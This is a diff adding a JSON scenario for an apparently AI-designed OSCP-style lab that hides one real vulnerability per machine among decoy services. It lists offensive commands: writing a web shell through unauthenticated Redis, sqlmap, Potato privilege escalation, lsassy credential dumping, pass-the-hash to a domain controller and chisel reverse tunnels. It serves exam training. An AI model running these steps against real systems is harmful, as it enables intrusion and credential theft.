@@ -1,0 +1,200 @@
+{
+  "id": "the-red-herring",
+  "title": "The Red Herring",
+  "category": "exam-simulation",
+  "source": ["AI-designed"],
+  "designed_by": "ai-composite",
+  "description": "Multiple decoy services. Real paths hidden behind vhost discovery or non-standard ports. Each machine has 2-3 decoy services and 1 real vulnerability. 6 machines, 2 networks, AD, pivot.",
+
+  "introduction": "Decoys waste exam time—this scenario trains you to find the real vuln (vhost, non-standard port) and ignore the noise.",
+  "mental_model": "Think: standard ports and default vhosts are often decoys. Enumerate vhosts, high ports, and obscure services.",
+  "key_principles": [
+    "ffuf/gobuster vhost when default site is clean",
+    "Full port scan; real vuln may be 8080, 8443, 9999",
+    "Decoys look vulnerable but lead nowhere",
+    "Time-box each path; abandon dead ends fast",
+    "One real vuln per machine—find it"
+  ],
+
+  "indicators": {
+    "difficulty": 6,
+    "cognitive_load": 6,
+    "enumeration_depth": 8,
+    "rabbit_hole_risk": 9,
+    "time_pressure": 7
+  },
+
+  "mitre": {
+    "tactics": ["TA0001", "TA0003", "TA0004", "TA0006", "TA0007"],
+    "techniques": [
+      {"id": "T1087.002", "name": "Account Discovery"},
+      {"id": "T1190", "name": "Exploit Public-Facing Application"},
+      {"id": "T1552.001", "name": "Credentials In Files"}
+    ]
+  },
+
+  "kill_chain_phases": ["T1-Recon", "T2-Web-Access", "T3-NonWeb-Access", "T4a-Linux-PrivEsc", "T4b-Win-PrivEsc", "T5-Credentials", "T6-Pivoting", "T7-Lateral"],
+
+  "environment": {
+    "machine_count": 6,
+    "network_count": 2,
+    "os_distribution": {"windows": 3, "linux": 3},
+    "has_ad": true,
+    "has_pivoting": true,
+    "has_client_side": false
+  },
+
+  "technique_tags": [
+    "vhost", "gobuster", "decoy", "rabbit-hole",
+    "ffuf", "non-standard-ports"
+  ],
+
+  "exam_relevance": {
+    "oscp_exam_format": true,
+    "pen200_modules": [6, 12, 16, 17, 18, 22],
+    "pattern_frequency": "medium",
+    "recommended_order": 13
+  },
+
+  "prerequisites": [],
+  "builds_on": [],
+
+  "networks": [
+    {"id": "external", "cidr": "192.168.25.0/24", "label": "External"},
+    {"id": "internal", "cidr": "10.10.35.0/24", "label": "AD Internal"}
+  ],
+
+  "machines": [
+    {
+      "id": "decoy1",
+      "label": "DECOY1",
+      "ip": "192.168.25.10",
+      "os": "Windows",
+      "role": "AD Entry",
+      "networks": ["external", "internal"],
+      "services": [
+        {"port": 80, "name": "HTTP (decoy)", "version": "", "vulnerabilities": [], "commands": []},
+        {"port": 443, "name": "HTTPS (decoy)", "version": "", "vulnerabilities": [], "commands": []},
+        {"port": 8080, "name": "HTTP admin (real)", "version": "", "vulnerabilities": [{"type": "rce", "summary": "Admin panel on 8080 vhost", "leads_to": "local-user"}], "commands": [{"cmd": "ffuf -u http://192.168.25.10 -H 'Host: admin.corp.local' -w vhosts.txt", "rationale": "Why: Real app often on hidden vhost, not default"}, "curl http://admin.corp.local:8080"]}
+      ],
+      "privesc": [{"from": "iis_user", "to": "SYSTEM", "technique": "PrintSpoofer", "commands": ["PrintSpoofer64.exe -i -c cmd"]}],
+      "credentials": [],
+      "alternatives": []
+    },
+    {
+      "id": "decoy2",
+      "label": "DECOY2",
+      "ip": "10.10.35.11",
+      "os": "Windows",
+      "role": "AD Member",
+      "networks": ["internal"],
+      "services": [
+        {"port": 445, "name": "SMB (decoy)", "version": "", "vulnerabilities": [], "commands": []},
+        {"port": 5985, "name": "WinRM (decoy)", "version": "", "vulnerabilities": [], "commands": []},
+        {"port": 8443, "name": "HTTPS (real)", "version": "", "vulnerabilities": [{"type": "auth", "summary": "ManageEngine on 8443", "leads_to": "local-user"}], "commands": ["nmap -p 8443 10.10.35.11", "curl -k https://10.10.35.11:8443"]}
+      ],
+      "privesc": [{"from": "svc_me", "to": "SYSTEM", "technique": "GodPotato", "commands": ["GodPotato-NET4.exe -cmd \"cmd /c whoami\""]}],
+      "credentials": [],
+      "alternatives": []
+    },
+    {
+      "id": "dc02",
+      "label": "DC02",
+      "ip": "10.10.35.5",
+      "os": "Windows",
+      "role": "Domain Controller",
+      "networks": ["internal"],
+      "services": [
+        {"port": 5985, "name": "WinRM", "version": "", "vulnerabilities": [{"type": "pth", "summary": "PtH with DA hash", "leads_to": "domain-admin"}], "commands": ["evil-winrm -i 10.10.35.5 -u Administrator -H '<hash>'"]},
+        {"port": 389, "name": "LDAP", "version": "", "vulnerabilities": [], "commands": []}
+      ],
+      "privesc": [],
+      "credentials": [],
+      "alternatives": []
+    },
+    {
+      "id": "decoy3",
+      "label": "DECOY3",
+      "ip": "192.168.25.20",
+      "os": "Linux",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {"port": 22, "name": "SSH (decoy)", "version": "", "vulnerabilities": [], "commands": []},
+        {"port": 80, "name": "HTTP (decoy)", "version": "", "vulnerabilities": [], "commands": []},
+        {"port": 9999, "name": "Custom (real)", "version": "", "vulnerabilities": [{"type": "rce", "summary": "Vulnerable service on 9999", "leads_to": "local-user"}], "commands": ["nmap -p- 192.168.25.20", "nc 192.168.25.20 9999"]}
+      ],
+      "privesc": [{"from": "user", "to": "root", "technique": "SUID", "commands": ["find / -perm -4000 2>/dev/null"]}],
+      "credentials": [],
+      "alternatives": []
+    },
+    {
+      "id": "decoy4",
+      "label": "DECOY4",
+      "ip": "192.168.25.21",
+      "os": "Linux",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {"port": 80, "name": "HTTP (decoy)", "version": "", "vulnerabilities": [], "commands": []},
+        {"port": 443, "name": "HTTPS (decoy)", "version": "", "vulnerabilities": [], "commands": []},
+        {"port": 8080, "name": "API (real)", "version": "", "vulnerabilities": [{"type": "sqli", "summary": "API vhost sqli", "leads_to": "rce"}], "commands": ["gobuster vhost -u http://192.168.25.21 -w vhosts.txt", "sqlmap -u 'http://api.corp.local:8080?id=1'"]}
+      ],
+      "privesc": [{"from": "www-data", "to": "root", "technique": "Docker", "commands": ["linpeas.sh"]}],
+      "credentials": [],
+      "alternatives": []
+    },
+    {
+      "id": "decoy5",
+      "label": "DECOY5",
+      "ip": "192.168.25.22",
+      "os": "Linux",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {"port": 21, "name": "FTP (decoy)", "version": "", "vulnerabilities": [], "commands": []},
+        {"port": 3306, "name": "MySQL (decoy)", "version": "", "vulnerabilities": [], "commands": []},
+        {"port": 6379, "name": "Redis (real)", "version": "", "vulnerabilities": [{"type": "unauth", "summary": "Redis no auth → RCE", "leads_to": "local-user"}], "commands": ["redis-cli -h 192.168.25.22", "config set dir /var/www/html", "config set dbfilename shell.php"]}
+      ],
+      "privesc": [{"from": "redis", "to": "root", "technique": "Cron", "commands": ["cat /etc/crontab"]}],
+      "credentials": [],
+      "alternatives": []
+    }
+  ],
+
+  "connections": [
+    {
+      "from": "decoy1",
+      "to": "decoy2",
+      "technique": "Pivot via DECOY1 to internal network",
+      "requires": "SYSTEM on DECOY1 (dual-homed)",
+      "pivot": true,
+      "path_ids": ["path-ad"],
+      "commands": [
+        "chisel server -p 8001 --reverse",
+        "chisel client <kali>:8001 R:socks",
+        "proxychains nmap -sT -Pn 10.10.35.11 -p 8443",
+        "proxychains curl -k https://10.10.35.11:8443"
+      ]
+    },
+    {
+      "from": "decoy2",
+      "to": "dc02",
+      "technique": "Pass-the-Hash to DC",
+      "requires": "DA hash from lsassy/mimikatz on DECOY2",
+      "pivot": false,
+      "path_ids": ["path-ad"],
+      "commands": [
+        "lsassy 10.10.35.11",
+        "proxychains evil-winrm -i 10.10.35.5 -u Administrator -H '<hash>'"
+      ]
+    }
+  ],
+
+  "attack_paths": [
+    {"id": "path-ad", "name": "AD: vhost 8080 → pivot → DC", "color": "#6bb8cc", "steps": ["decoy1", "decoy2", "dc02"], "description": "Real vuln on 8080 vhost, decoys on 80/443"},
+    {"id": "path-decoy3", "name": "DECOY3: Port 9999", "color": "#e8a87c", "steps": ["decoy3"], "description": "Real vuln on high port 9999"},
+    {"id": "path-decoy4", "name": "DECOY4: API vhost", "color": "#85e89d", "steps": ["decoy4"], "description": "Real vuln on API vhost"},
+    {"id": "path-decoy5", "name": "DECOY5: Redis", "color": "#d2a8ff", "steps": ["decoy5"], "description": "Real vuln Redis, decoys FTP/MySQL"}
+  ]
+}
